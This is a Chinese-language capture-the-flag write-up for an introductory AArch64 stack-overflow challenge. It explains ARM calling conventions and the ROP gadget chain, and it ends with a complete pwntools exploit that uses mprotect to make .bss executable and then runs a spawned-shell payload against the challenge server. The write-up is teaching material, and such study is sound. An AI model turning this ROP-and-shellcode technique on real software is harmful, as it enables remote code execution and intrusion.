先说一下需要搭建的环境：

1.安装qemu:sudo apt-get install qemu-user

2.安装gdb-multiarch:sudo apt-get install gdb-multiarch

3.安装依赖库:sudo apt install gcc-arm-linux-gnueabi gcc-aarch64-linux-gnu

然后就可以通过qemu起一个虚拟机模拟arm架构的环境了

qemu-aarch64 -g 1234 -L /usr/aarch64-linux-gnu ./arm

-g参数表示等待gdb调试连接端口，-L表示加载指定的动态链接库

启动之后就再起一个终端用gdb-multiarch来进行调试就可以了,指令如下:

gdb-multiarch arm -q;

然后在gdb-multiarch界面里输入target remote:1234，就可以进行调试了

界面如图

![v2-9287e32f68924b5f0493a02d938bf42e_r.jp](https://pic3.zhimg.com/v2-9287e32f68924b5f0493a02d938bf42e_r.jpg)

在pwntools里可以写成这样的模板,然后就用上面的命令区连接就可以了

from pwn import * import sys context.binary = './binary' if args[1] == 'r': p
= remote('remote_addr',port) if args[1] == 'l': p = process(["qemu-aarch64","-g","1234","-L","/usr/aarch64-linux-gnu","./binary"]) elf =
ELF('./binary') context.log_level = 'debug' pause()

接下来看下题目，IDA7.0
Pro已经可以支持ARM反编译了，我们就来分析下这个程序，最开始是往bss端上读0x200个字符，然后又往栈里读了0x200个字符，猜测是不是返回到bss端执行shellcode，但是最后发现不是，因为查看bss段后没有x权限。

__int64 sub_400818() { sub_400760(); write(1LL, "Name:", 5LL); read(0LL,
&unk_411068, 512LL); sub_4007F0(); return 0LL; } __int64 sub_4007F0() {
__int64 v1; // [xsp+10h] [xbp+10h] return read(0LL, &v1, 512LL); }

然后发现函数列表里有mprotect函数

在这个位置被调用了

.text:00000000004007E0 BL .mprotect .text:00000000004007E4 NOP
.text:00000000004007E8 LDP X29, X30, [SP],#0x10 .text:00000000004007EC RET

所以确定了思路那就是第一次往bss段读数据的时候把shellcode输入进去，然后在栈溢出那里通过ROP用mprotect给bss开权限，然后控制返回地址到bss段写的shellcode上。那接下来就是找gadget。但是满屏幕的汇编让我看不懂，于是我去查了下资料。发现ARM架构里是没有POP和PUSH指令的,他们的指令是这样的。

![v2-9a3628d3b3fe8bb0f0718f1c6a5c7848_r.jp](https://pic3.zhimg.com/v2-9a3628d3b3fe8bb0f0718f1c6a5c7848_r.jpg)

ARM架构下调用函数的约定是，X0,X1,X2,X3寄存器传递前四个参数，后面的参数从右到左依次入栈。ARM架构下的PC寄存器就相当于x86的IP寄存器，都指向下一条指令的地址，同时BL指令实现了跳转到调用的函数处执行，跳转的同时会存储返回地址到X30寄存器中，在给被调用函数开辟栈帧的时候，会将BL指令存储在X30中的返回地址压入栈中，在调用函数结束后，会将栈里的返回地址弹回给X30寄存器，RET指令会将X30的内容给到PC寄存器。这就是为什么在这个函数的开头会有这个指令

STP X29, X30, [SP,#-0x10+var_s0]!

在这个指令执行之后，SP寄存器也就是栈顶指针会-0x10。是!和#-0x10在发挥作用。也就是类似这种在[]后有个!，并且[]里有数字的话，就会将里面寄存器进行运算后将数据写回第一个寄存器，这里SP会用原来的数据-0x10+0后写回SP。或者类似这种

LDP X29, X30, [SP+var_s0],#0x40

这种在[]后面还有数字的，在将sp+var_s0偏移处取0x10大小的数据，分成0x8大小的两份数据按顺序放到X29
X30的寄存器中，并且SP指针会+0x40。

既然清楚了各个指令都做了什么，接下来就是找栈溢出的偏移然后再找gadget。

那么该如何确定偏移呢

![v2-0d0e0612ce03dcc2e77c6ddba7e26445_r.jp](https://pic1.zhimg.com/v2-0d0e0612ce03dcc2e77c6ddba7e26445_r.jpg)

可以看到这个栈溢出函数里，首先将X29,X30两个寄存的值压入栈中同时将栈帧抬高了0x50。然后将当前栈顶指针的值赋值给X29，这里要注意一点，ARM架构下试没有BP栈底指针的，所以在刚调用函数时X29保存的是上一个函数栈帧的状态，压入栈中方便调用完函数后恢复现场。保存好上一个栈帧的状态之后，再把当前栈顶指针赋值给X29寄存器。这里可以看到read的函数时，三个参数分别是0,SP+10,0x200，也就是相当于在往当前栈顶+0x10处读数据，所以可以算出输入位置距离返回地址的偏移0x50-0x10+0x8=0x48=72.为什么+0x8是因为x29寄存器也被入栈了。所以还要加八个字节的大小。

确定偏移之后，就是找gadget了。

查阅资料后，发现ARM架构下也有一个万能gadget,

![v2-c4a3c6532b9de62a795a866e3c60a0d8_r.jp](https://pic3.zhimg.com/v2-c4a3c6532b9de62a795a866e3c60a0d8_r.jpg)

从4008cc开始加载了栈内的数据到x19 x20 x21 x22 x24 x24 x29
x30这八个寄存器里，我们可以通过将返回地址控制到0x4008cc,然后后面的数据我们可以构造好，从而控制x30这个寄存器，ret之后跳回到0x4008ac处执行,会将[X21+X19<<3]内存处的内容赋值给X3,X22赋值给X2，X23赋值给X1，X24赋值给X0，然后跳到X3执行，这样我们就有了能控制三个参数的mprotect，就可以给bss段开执行权限了。然后就是写shellcode执行了。

ROP布置如下:

payload = 'a'*72 #offset payload += p64(0x4008cc) #ret addr payload +=
p64(0x0) #x29 payload += p64(0x4008ac) #x30 payload += p64(0) #x19 payload +=
p64(1) #x20 payload += p64(0x411068) #x21 payload += p64(0x7) #x22 payload +=
p64(0x1000) #x23 payload += p64(0x411000) #x24 payload += p64(0) #after
mprotect x29 payload += p64(0x411068+0x8) #x30 ret addr

可以注意到我们这里布置的是0x411068来控制X3寄存器，因为是将[X21]的内容赋值给X3，所以这里我们先在bss段上填好有调用mprotect函数的指令地址，然后将0x40011068里存储的指令地址赋值给X3。后两行构造成这样的原因是

![v2-3d1481a8c16b85c3c29e4fcb7cd81332_r.jp](https://pic3.zhimg.com/v2-3d1481a8c16b85c3c29e4fcb7cd81332_r.jpg)

调用mprotect后，会将相应栈顶的值弹回给X29
X30两个寄存器，然后RET。也就是说0x411068+0x8处是返回地址，这时bss段已经被我们开启了可执行权限，这样执行就没有问题了。

exp:

from pwn import * import sys context.binary = './arm' if sys.argv[1] == "r": p
= remote('node3.buuoj.cn',27938) if sys.argv[1] == "l": p = process(["qemu-aarch64","-g","1234","-L","/usr/aarch64-linux-gnu","./arm"]) p =
remote('127.0.0.1',10002) elf = ELF('./arm') context.log_level = 'debug'
shellcode = asm(shellcraft.aarch64.sh()) mprotect = 0x4007e0 pause()
p.recvuntil('Name:') pause() payload = p64(mprotect) + shellcode
p.sendline(payload) sleep(0.1) payload = 'a'*72 payload += p64(0x4008cc)
payload += p64(0x0) #x29 payload += p64(0x4008ac) #x30 payload += p64(0) #x19
payload += p64(1) #x20 payload += p64(0x411068) #x21 payload += p64(0x7) #x22
payload += p64(0x1000) #x23 payload += p64(0x411000) #x24 payload += p64(0)
payload += p64(0x411068+0x8) pause() p.sendline(payload) p.interactive()

总结：这只是一道ARM架构下的入门题，所以题目的难度不是很大，但是初学者可以通过这道题了解到ARM架构下函数的调用约定，ARM架构下的部分指令集，以及跟X86架构调用函数过程的异同，还有ARM架构下ROP的构造，可以说蛮有意义的。

声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关！

  

